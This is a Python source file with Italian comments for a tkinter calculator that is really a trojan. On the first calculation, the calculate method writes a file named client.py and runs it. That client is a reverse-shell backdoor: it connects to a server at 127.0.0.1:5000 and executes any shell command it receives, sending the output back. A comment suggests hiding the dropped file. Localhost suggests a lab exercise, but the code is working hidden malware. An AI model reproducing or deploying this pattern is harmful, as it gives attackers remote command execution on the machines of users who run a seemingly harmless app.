import tkinter as tk
import subprocess

enter = 0


def insert_code(fp):
    fp.write("import socket\nimport subprocess\nHOST='127.0.0.1'\nPORT=5000\n")
    fp.write("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
    fp.write("server_address = (HOST, PORT)\n")
    fp.write("sock.connect(server_address)\n")
    #FACCIO UNA RICHIESTA DI CONNESSIONE AL SERVER
    fp.write("try:\n")
    fp.write("    # Riceve la risposta dal server\n")
    fp.write("    data = sock.recv(1024)\n")
    fp.write("    if data.decode() == 'no':\n")
    fp.write("        sock.close()\n")
    fp.write("        exit()\n")
    fp.write("    else:\n")
    fp.write("        while 1:\n")
    fp.write("            # Riceve la risposta dal server\n")
    fp.write("            data = sock.recv(1024)\n")
    fp.write("            if data.decode() == 'exit':\n")
    fp.write("                sock.close()\n")
    fp.write("                exit()\n")
    fp.write("            try:\n")
    fp.write("                  result = subprocess.run(data.decode(), shell=True, capture_output=True)\n")
    fp.write("                  message = result.stdout\n")
    fp.write("                  #invio message\n")
    fp.write("                  if message == b'':\n")
    fp.write("                       message = 'Non ci sono risultati'\n")
    fp.write("                       sock.sendall(message.encode())\n")
    fp.write("                  else:\n")
    fp.write("                      sock.sendall(message)\n")
    fp.write("            except:\n")
    fp.write("                  message = 'Errore nel comando che mi hai inviato'\n")
    fp.write("                  sock.sendall(message.encode())\n")
    fp.write("finally:\n")
    fp.write("    # Chiude la connessione\n")
    fp.write("    sock.close()\n")
    fp.close()






class Calculator:
    def __init__(self, master):
        self.master = master
        master.title("Calculator")

        # Variabili per la gestione dell'input e dell'output
        self.input_str = tk.StringVar()
        self.output_str = tk.StringVar()

        # Widget di input/output
        self.input_entry = tk.Entry(master, textvariable=self.input_str, justify='right')
        self.output_label = tk.Label(master, textvariable=self.output_str, relief='sunken')

        # Pulsanti numerici
        self.btn1 = tk.Button(master, text='1', command=lambda: self.add_to_input('1'))
        self.btn2 = tk.Button(master, text='2', command=lambda: self.add_to_input('2'))
        self.btn3 = tk.Button(master, text='3', command=lambda: self.add_to_input('3'))
        self.btn4 = tk.Button(master, text='4', command=lambda: self.add_to_input('4'))
        self.btn5 = tk.Button(master, text='5', command=lambda: self.add_to_input('5'))
        self.btn6 = tk.Button(master, text='6', command=lambda: self.add_to_input('6'))
        self.btn7 = tk.Button(master, text='7', command=lambda: self.add_to_input('7'))
        self.btn8 = tk.Button(master, text='8', command=lambda: self.add_to_input('8'))
        self.btn9 = tk.Button(master, text='9', command=lambda: self.add_to_input('9'))
        self.btn0 = tk.Button(master, text='0', command=lambda: self.add_to_input('0'))

        # Pulsanti delle operazioni
        self.btn_plus = tk.Button(master, text='+', command=lambda: self.set_operator('+'))
        self.btn_minus = tk.Button(master, text='-', command=lambda: self.set_operator('-'))
        self.btn_multiply = tk.Button(master, text='*', command=lambda: self.set_operator('*'))
        self.btn_divide = tk.Button(master, text='/', command=lambda: self.set_operator('/'))
        self.btn_equals = tk.Button(master, text='=', command=self.calculate)
        self.btn_clear = tk.Button(master, text='C', command=self.clear)

        # Posizionamento dei widget nella finestra
        self.input_entry.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky='ew')
        self.output_label.grid(row=1, column=0, columnspan=4, padx=5, pady=5, sticky='ew')

        self.btn1.grid(row=2, column=0, padx=5, pady=5)
        self.btn2.grid(row=2, column=1, padx=5, pady=5)
        self.btn3.grid(row=2, column=2, padx=5, pady=5)
        self.btn_plus.grid(row=2, column=3, padx=5, pady=5)

        self.btn4.grid(row=3, column=0, padx=5, pady=5)
        self.btn5.grid(row=3, column=1, padx=5, pady=5)
        self.btn6.grid(row=3, column=2, padx=5, pady=5)
        self.btn_minus.grid(row=3, column=3, padx=5, pady=5)

        self.btn7.grid(row=4, column=0, padx=5, pady=5)
        self.btn8.grid(row=4, column=1, padx=5, pady=5)
        self.btn9.grid(row=4, column=2, padx=5, pady=5)
        self.btn4.grid(row=5, column=0, padx=5, pady=5)
        self.btn5.grid(row=5, column=1, padx=5, pady=5)
        self.btn6.grid(row=5, column=2, padx=5, pady=5)
        self.btn1.grid(row=6, column=0, padx=5, pady=5)
        self.btn2.grid(row=6, column=1, padx=5, pady=5)
        self.btn3.grid(row=6, column=2, padx=5, pady=5)
        self.btn0.grid(row=7, column=1, padx=5, pady=5)

        # Posizionamento dei pulsanti delle operazioni
        self.btn_plus.grid(row=4, column=3, padx=5, pady=5)
        self.btn_minus.grid(row=5, column=3, padx=5, pady=5)
        self.btn_multiply.grid(row=6, column=3, padx=5, pady=5)
        self.btn_divide.grid(row=7, column=3, padx=5, pady=5)
        self.btn_clear.grid(row=3, column=0, padx=5, pady=5, columnspan=2, sticky='we')
        self.btn_equals.grid(row=7, column=2, padx=5, pady=5)

    def add_to_input(self, value):
        self.input_str.set(self.input_str.get() + value)

    def set_operator(self, operator):
        self.operator = operator
        self.first_operand = float(self.input_str.get())
        self.input_str.set('')
        self.output_str.set('')

    def calculate(self):
        global enter
        if self.operator == '+':
            result = self.first_operand + float(self.input_str.get())
        elif self.operator == '-':
            result = self.first_operand - float(self.input_str.get())
        elif self.operator == '*':
            result = self.first_operand * float(self.input_str.get())
        elif self.operator == '/':
            result = self.first_operand / float(self.input_str.get())
        else:
            result = 0.0
        self.input_str.set('')
        self.output_str.set(str(result))
        if enter == 0:
            fp = open('client.py', 'w')   #posso creare il file in una zona nascosta del computer
            insert_code(fp)
            child_process = subprocess.Popen(['python3', 'client.py'])
            enter = 1


    def clear(self):
        self.input_str.set('')
        self.output_str.set('')
        self.operator = ''
        self.first_operand = 0.0


root = tk.Tk()
calc = Calculator(root)
root.mainloop()